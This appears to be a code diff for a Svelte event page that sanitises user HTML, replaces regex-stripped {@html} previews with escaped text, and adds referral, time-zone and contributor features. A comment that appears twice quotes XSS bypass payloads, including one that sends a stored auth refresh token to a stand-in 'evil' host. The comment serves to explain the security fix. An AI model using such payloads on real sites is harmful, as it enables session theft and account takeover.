@@ -1,7 +1,13 @@
 <script lang="ts">
+	// C-09 — every user-content {@html} sink routes through one shared
+	// sanitizer. A bare {@html} on stored content is a bug.
+	import { sanitizeHtml } from '$lib/security/sanitizeHtml';
 	import { goto } from '$app/navigation';
 	import { page } from '$app/stores';
 	import SubscribeModal from '$lib/components/SubscribeModal.svelte';
+	// C-14 — plain-text preview helper. Replaces two `{@html}` sinks that fed a
+	// regex tag-strip straight back into the HTML parser.
+	import { stripTagsForPreview } from '$lib/utils/textPreview';
 	import Seo from '$lib/components/Seo.svelte';
 	import { publicSubscribeToCollection } from '$lib/services/collection.services';
 	import { getEventDays, getPublicEventPage } from '$lib/services/event.services';
@@ -16,6 +22,8 @@
 	import { onMount } from 'svelte';
 	import RegistrationModal from '../components/modal/RegistrationModal.svelte';
 	import OrganiserList from '../components/OrganiserList.svelte';
+	import PromoterCard from '../components/PromoterCard.svelte';
+	import { formatInZone, formatDateInZone, zoneAbbreviation } from '$lib/utils/eventTime';
 
 	export let data: any = {};
 	$: seo = data?.seo;
@@ -43,12 +51,49 @@
 	let paymentFailed = false;
 	let paymentRegId = '';
 	let eventDaysData: any[] = [];
+	/**
+	 * Celebration-layer flags, RESOLVED server-side.
+	 *
+	 * `guestContributions.enabled` here is already the AND of the legacy
+	 * `donationsEnabled` master switch and the config block, and
+	 * `giftRegistry.enabled` already accounts for `showOnPublicPage`. Never
+	 * re-derive either from `event.*` on this page.
+	 */
+	let features: import('$lib/services/event.services').PublicEventFeatures | null = null;
+	/** Public contributor wall — names + notes only; per-person amounts never leave the server. */
+	let contributorWall: { name: string; message: string | null; at: string }[] = [];
+	let contributorSummary = { contributorCount: 0, raisedKobo: 0 };
 
 	let themeColor: Color = colors[0];
 	$: if (eventId) themeColor = getEventTheme(eventId);
 
 	onMount(async () => {
 		if (!eventId) return;
+
+		/**
+		 * GAP 9 — capture `?ref=CODE` from a promoter's link.
+		 *
+		 * sessionStorage, NOT localStorage, and keyed per event. localStorage
+		 * would carry a code from one event into a completely unrelated one
+		 * weeks later and pay commission on a sale that promoter had nothing to
+		 * do with. Session scope also means closing the tab ends the claim,
+		 * which is the honest reading of "they came through this link".
+		 *
+		 * The click beacon is fired here rather than server-side because this
+		 * is where a real human actually opened the page.
+		 */
+		try {
+			const ref = new URLSearchParams(window.location.search).get('ref');
+			if (ref) {
+				const clean = ref.trim().toUpperCase().slice(0, 16);
+				sessionStorage.setItem(`rondwell_ref_${eventId}`, clean);
+				const { trackPromoterClick } = await import('$lib/services/promoter.services');
+				trackPromoterClick(eventId, clean);
+			}
+		} catch {
+			/* a lost referral is a lost stat, never a broken page */
+		}
+
 		try {
 			const data = await getPublicEventPage(eventId);
 			event = data.event;
@@ -60,6 +105,19 @@
 			collectionInfo = data.collection;
 			registrationFields = data.registrationFields ?? [];
 			organizerProfile = data.organizerProfile ?? null;
+			features = data.features ?? null;
+
+			// The contributor wall is decoration on an otherwise-working page —
+			// loaded separately and never allowed to break the render.
+			if (features?.guestContributions?.enabled && features.guestContributions.showOnPublicPage) {
+				import('$lib/services/contribution.services')
+					.then(({ getContributorWall }) => getContributorWall('EVENT', eventId))
+					.then((wall) => {
+						contributorWall = wall.data;
+						contributorSummary = wall.summary;
+					})
+					.catch(() => {});
+			}
 
 			// Auto-select first available ticket
 			if (ticketTypes.length > 0) {
@@ -131,26 +189,80 @@
 	});
 
 	// Helpers
+
+	/**
+	 * H-75 — the zone the event happens in, for every formatter below.
+	 *
+	 * Falls back to the viewer's zone only when the event carries none. That
+	 * fallback is honest: with no `event.timeZone` there is nothing else to
+	 * render in, and `zoneAbbreviation` will then label it with the viewer's
+	 * zone rather than claiming the event's.
+	 */
+	$: eventZone =
+		(event?.timeZone as string) ||
+		(() => {
+			try {
+				return Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC';
+			} catch {
+				return 'UTC';
+			}
+		})();
+
+	/**
+	 * H-75 — formatted **in the event's zone**.
+	 *
+	 * `toLocaleDateString` with no `timeZone` option formats in the *runtime's*
+	 * zone. For an evening event that means the date itself can be wrong: a
+	 * 9:00 PM Lagos event on the 5th is 4:00 PM New York on the 5th, but a
+	 * 1:00 AM Lagos event on the 6th renders as the 5th in New York. **The
+	 * attendee reads the wrong day for an event they have paid for.**
+	 */
 	function formatEventDate(dt: string): string {
 		if (!dt) return 'Date TBD';
-		const d = new Date(dt);
-		return d.toLocaleDateString('en-US', { weekday: 'long', month: 'short', day: 'numeric' });
+		return formatDateInZone(dt, eventZone, {
+			weekday: 'long',
+			month: 'short',
+			day: 'numeric'
+		});
 	}
 
+	/**
+	 * H-75 — **the digits and the label now come from the same zone.**
+	 *
+	 * This formatted with `toLocaleTimeString` and no `timeZone` option — the
+	 * viewer's zone — and then appended `tz`, which is `event.timeZone`. So a
+	 * 7:00 PM Lagos event viewed from New York rendered **"2:00 PM
+	 * Africa/Lagos"**: a real time, a real zone name, and a statement that is
+	 * false.
+	 *
+	 * The label is now a short abbreviation derived from the same instant and
+	 * zone used for the digits (`WAT`, `GMT+1`), rather than the raw IANA name.
+	 * The IANA name looks authoritative, which is part of why the mismatch was
+	 * hard to notice.
+	 *
+	 * The same-day comparison is made **in the event's zone** too, using the
+	 * formatted date strings — comparing `getDate()` on two `Date` objects
+	 * compares them in the viewer's zone and can disagree with what is being
+	 * displayed.
+	 */
 	function formatEventTime(start: string, end: string, tz: string): string {
 		if (!start) return '';
-		const sDate = new Date(start);
-		const s = sDate.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
-		if (!end) return tz ? `${s} ${tz}` : s;
-		const eDate = new Date(end);
-		const e = eDate.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit' });
-		const tzLabel = tz ? ` ${tz}` : '';
-		// Show end date if it's a different day
-		const sameDay = sDate.getFullYear() === eDate.getFullYear() && sDate.getMonth() === eDate.getMonth() && sDate.getDate() === eDate.getDate();
-		if (sameDay) {
-			return `${s} – ${e}${tzLabel}`;
-		}
-		const endDateStr = eDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
+		const zone = tz || eventZone;
+
+		const s = formatInZone(start, zone, { hour: 'numeric', minute: '2-digit', hour12: true });
+		const tzLabel = zone ? ` ${zoneAbbreviation(start, zone)}` : '';
+
+		if (!end) return `${s}${tzLabel}`;
+
+		const e = formatInZone(end, zone, { hour: 'numeric', minute: '2-digit', hour12: true });
+
+		const sameDay =
+			formatDateInZone(start, zone, { year: 'numeric', month: '2-digit', day: '2-digit' }) ===
+			formatDateInZone(end, zone, { year: 'numeric', month: '2-digit', day: '2-digit' });
+
+		if (sameDay) return `${s} – ${e}${tzLabel}`;
+
+		const endDateStr = formatDateInZone(end, zone, { month: 'short', day: 'numeric' });
 		return `${s} – ${endDateStr}, ${e}${tzLabel}`;
 	}
 
@@ -471,11 +583,45 @@
 					</div>
 					{#if event.description}
 					<p class="mt-3 line-clamp-3 text-sm font-light leading-6" style="color: {themeColor.lightText};">
-						{@html event.description.replace(/<[^>]*>/g, '').slice(0, 150)}{event.description.length > 150 ? '...' : ''}
+						<!--
+							C-14 — `{@html}` REMOVED. This was
+							`{@html event.description.replace(/<[^>]*>/g, '').slice(0, 150)}`.
+
+							A regex tag-strip is not a sanitiser, and re-parsing its output
+							with `{@html}` defeats whatever it did do. Two one-line bypasses:
+
+							  nested tag        `<<a>img src=x onerror=…>`
+							                    the regex eats `<a>`, leaving a live `<img>`
+
+							  unterminated tag  `<img src=x onerror=fetch('//evil/'+localStorage.auth_refresh_token)`
+							                    no `>` anywhere, so the regex matches nothing
+							                    and the parser auto-closes it on insertion
+
+							This sink is inside the *Presented by* card, so it fires on any
+							event belonging to a collection. The `.replace()` read as though
+							the value were already sanitised, which is why it survived a
+							review that fixed the other sink on this page.
+
+							This only ever wanted plain text — so let Svelte escape it. The
+							regex stays as a display nicety (strip markup from the preview),
+							not as a security control.
+						-->
+						{stripTagsForPreview(event.description)}
 					</p>
 					{/if}
 				</div>
 				{/if}
+
+				<!-- GAP 9 — promoter CTA. Renders nothing at all when the organizer
+				     hasn't enabled promoter mode, so the column is unchanged for
+				     every event that doesn't use it. -->
+				<PromoterCard
+					{eventId}
+					eventTitle={event?.title ?? ''}
+					eventSlug={event?.customLinkSlug ?? ''}
+					{themeColor}
+					promoter={features?.promoter ?? null}
+				/>
 
 				<!-- Organized By -->
 				<div class="mt-6 rounded-[16px] p-4" style="background-color: {themeColor.cover};">
@@ -552,6 +698,27 @@
 				<h2 class="text-3xl font-bold md:text-[48px] md:leading-[56px]" style="color: {themeColor.text};">
 					{event.title}
 				</h2>
+
+				<!-- GAP 7 — age badge. Themed, never hardcoded colours. -->
+				{#if features?.ageRestriction?.enabled}
+					<div class="mt-3 flex flex-wrap items-center gap-2">
+						<span
+							class="inline-flex w-fit items-center gap-1.5 rounded-full px-3 py-1 text-xs font-semibold"
+							style="background-color: {themeColor.smallCover}; color: {themeColor.text};"
+						>
+							🔞 {features.ageRestriction.minimumAge}+ only
+						</span>
+						{#if features.ageRestriction.verificationMethod === 'ID_REQUIRED'}
+							<span
+								class="inline-flex w-fit items-center gap-1 rounded-full border px-2.5 py-1 text-xs"
+								style="border-color: {themeColor.toggle}; color: {themeColor.lightText};"
+							>
+								Verified ID required
+							</span>
+						{/if}
+					</div>
+				{/if}
+
 				{#if collectionInfo}
 				<div class="mt-2 flex items-center md:hidden">
 					<div class="mr-2 size-4 rounded-[4px] border flex items-center justify-center text-[8px]" style="border-color: {themeColor.toggle};">🎪</div>
@@ -761,7 +928,7 @@
 							<span class="text-sm font-medium" style="color: {themeColor.lightText};">{formatTicketPrice(ticket)}</span>
 						</div>
 						{#if ticket.description}
-						<div class="ticket-desc mt-2 text-xs leading-relaxed" style="color: {themeColor.lightText};">{@html ticket.description}</div>
+						<div class="ticket-desc mt-2 text-xs leading-relaxed" style="color: {themeColor.lightText};">{@html sanitizeHtml(ticket.description)}</div>
 						{/if}
 						{#if salesEnded}
 						<p class="mt-2 text-xs" style="color: {themeColor.lightText};">{salesEnded}</p>
@@ -852,6 +1019,7 @@
 						{registrationFields}
 						ticketQuantity={ticketQuantity[selectedTicket] ?? 1}
 						isGroupRegistration={isGroupEnabled && (ticketQuantity[selectedTicket] ?? 1) > 1}
+						{features}
 					/>
 				</div>
 				{/if}
@@ -868,7 +1036,45 @@
 					<h2 class="text-lg font-medium" style="color: {themeColor.text};">About Event</h2>
 				</div>
 				<div class="event-description px-5 pb-5 prose prose-sm max-w-none" style="color: {themeColor.lightText};">
-					{@html event.description}
+					{@html sanitizeHtml(event.description)}
+				</div>
+			</div>
+			{/if}
+
+			<!--
+				GAP 6 — public contributor wall.
+
+				Names (or "Anonymous") and notes only. Per-person amounts are never
+				sent by the API and must never be shown: publishing who gave how
+				much is a social harm, and the aggregate is all the page needs.
+			-->
+			{#if features?.guestContributions?.enabled && features.guestContributions.showOnPublicPage && contributorSummary.contributorCount > 0}
+			<div class="mb-5 max-w-2xl rounded-2xl" style="background-color: {themeColor.cover};">
+				<div class="flex items-center justify-between gap-2 border-b p-5" style="border-color: {themeColor.toggle};">
+					<h2 class="flex items-center gap-2 text-lg font-medium" style="color: {themeColor.text};">
+						🎁 Gifts &amp; contributions
+					</h2>
+					<span class="text-sm" style="color: {themeColor.lightText};">
+						{contributorSummary.contributorCount} {contributorSummary.contributorCount === 1 ? 'person' : 'people'}
+					</span>
+				</div>
+				<div class="flex flex-col gap-3 px-5 pb-5 pt-4">
+					{#each contributorWall as c}
+						<div class="flex items-start gap-3">
+							<div
+								class="flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full text-xs font-semibold"
+								style="background-color: {themeColor.smallCover}; color: {themeColor.text};"
+							>
+								{(c.name || '?').charAt(0).toUpperCase()}
+							</div>
+							<div class="min-w-0">
+								<p class="text-sm font-medium" style="color: {themeColor.text};">{c.name}</p>
+								{#if c.message}
+									<p class="mt-0.5 text-sm break-words" style="color: {themeColor.lightText};">{c.message}</p>
+								{/if}
+							</div>
+						</div>
+					{/each}
 				</div>
 			</div>
 			{/if}
@@ -963,7 +1169,30 @@
 					</div>
 					{#if event.description}
 					<p class="mt-3 line-clamp-3 text-sm font-light leading-6" style="color: {themeColor.lightText};">
-						{@html event.description.replace(/<[^>]*>/g, '').slice(0, 150)}{event.description.length > 150 ? '...' : ''}
+						<!--
+							C-14 — `{@html}` REMOVED. This was
+							`{@html event.description.replace(/<[^>]*>/g, '').slice(0, 150)}`.
+
+							A regex tag-strip is not a sanitiser, and re-parsing its output
+							with `{@html}` defeats whatever it did do. Two one-line bypasses:
+
+							  nested tag        `<<a>img src=x onerror=…>`
+							                    the regex eats `<a>`, leaving a live `<img>`
+
+							  unterminated tag  `<img src=x onerror=fetch('//evil/'+localStorage.auth_refresh_token)`
+							                    no `>` anywhere, so the regex matches nothing
+							                    and the parser auto-closes it on insertion
+
+							This sink is inside the *Presented by* card, so it fires on any
+							event belonging to a collection. The `.replace()` read as though
+							the value were already sanitised, which is why it survived a
+							review that fixed the other sink on this page.
+
+							This only ever wanted plain text — so let Svelte escape it. The
+							regex stays as a display nicety (strip markup from the preview),
+							not as a security control.
+						-->
+						{stripTagsForPreview(event.description)}
 					</p>
 					{/if}
 				</div>
